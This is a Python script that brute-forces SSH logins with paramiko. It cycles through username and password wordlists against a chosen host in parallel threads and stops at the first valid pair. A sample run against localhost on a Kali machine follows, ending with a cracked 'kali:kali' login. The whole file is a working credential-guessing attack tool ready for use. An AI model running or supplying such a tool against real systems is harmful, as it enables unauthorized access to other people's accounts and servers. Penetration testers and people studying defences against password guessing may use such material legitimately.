#!/usr/bin/python3
import paramiko
import time
import socket
import threading
import sys

# Global flag to stop threads
stop_flag = False

def brute_force_ssh(hostname, port, user, password, delay=3):
    global stop_flag
    if stop_flag:
        return

    # Logging
    paramiko.util.log_to_file('log.log')

    # Create an SSH client
    ssh_client = paramiko.SSHClient()
    ssh_client.load_system_host_keys()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"Testing Credentials {user}:{password}")
        # Attempt to connect
        ssh_client.connect(hostname, port=int(port), username=user, password=password, timeout=5)
        print(f"[+] Valid credentials found: {user}:{password}")
        stop_flag = True  # Stop other threads
    except paramiko.AuthenticationException:
        print(f"[-] Authentication failed: {user}:{password}")
    except paramiko.SSHException as e:
        print(f"[-] SSH error: {e}")
    except socket.error as e:
        print(f"[-] Socket error: {e}")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    finally:
        ssh_client.close()
        time.sleep(delay)  # Delay between attempts

def main():
    global stop_flag
    print("*******Brute SSH*********")
    hostname = input("Enter the target hostname>> ")
    port = input("Port>> ")
    username_file = input("Path to username wordlist: ")
    password_file = input("Path to password wordlist: ")
    delay = int(input("Delay between attempts (seconds)>> "))
    print("=============================")

    # Read wordlists
    try:
        with open(username_file, 'r') as f:
            users = [line.strip() for line in f.readlines()]
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f.readlines()]
    except FileNotFoundError as e:
        print(f"[-] File not found: {e}")
        sys.exit(1)

    # Create threads for brute-forcing
    threads = []
    for user in users:
        for password in passwords:
            if stop_flag:
                break
            thread = threading.Thread(target=brute_force_ssh, args=(hostname, port, user, password, delay))
            thread.start()
            threads.append(thread)
            time.sleep(0.1)  # Small delay to avoid overwhelming the system

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    print("Brute-forcing complete.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[-] Script interrupted by user. Exiting...")
        stop_flag = True
        sys.exit(0)


'''
 ┌──(root㉿kali)-[/home/kali/python/ssh_ftp]
└─# python ssh_brute.py
*******Brute SSH*********
Enter the target hostname>> 127.0.0.1
Port>> 22
Path to username wordlist: users.txt
Path to password wordlist: passlist.txt
Delay between attempts (seconds)>> 3
=============================
Testing Credentials root:allan
Testing Credentials root:all
Testing Credentials root:user
Testing Credentials root:admin
Testing Credentials root:tar
Testing Credentials root:tor
Testing Credentials root:compa
Testing Credentials root:kali
Testing Credentials root:12345
Testing Credentials user:allan
Testing Credentials user:all
Testing Credentials user:user
Testing Credentials user:admin
[-] Authentication failed: home:admin
Testing Credentials kali:kali
Testing Credentials kali:12345
[-] Authentication failed: home:tar
[-] Authentication failed: home:tor
[+] Valid credentials found: kali:kali
[-] Authentication failed: ftp:allan
[-] Authentication failed: ftp:all
[-] Authentication failed: kali:allan
[-] Authentication failed: ftp:tor
[-] Authentication failed: ftp:compa
[-] Authentication failed: kali:all
[-] Authentication failed: ftp:12345
[-] Authentication failed: kali:admin
[-] Authentication failed: kali:compa
[-] Authentication failed: kali:12345
Brute-forcing complete.
                                             '''